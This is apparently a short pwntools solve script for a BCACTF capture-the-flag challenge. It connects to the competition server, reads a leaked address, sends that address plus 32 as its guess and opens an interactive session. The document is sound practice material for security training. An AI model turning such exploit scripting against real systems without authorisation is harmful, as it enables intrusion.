from pwn import *
from icecream import ic

io = remote("challs.bcactf.com", 30810)
context.log_level = 'debug'

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

ru("in is ")
leak = int(rl().decode().strip(), 16)
ru("guess> ")
sl(f"{hex(leak + 32)}".encode())

io.interactive()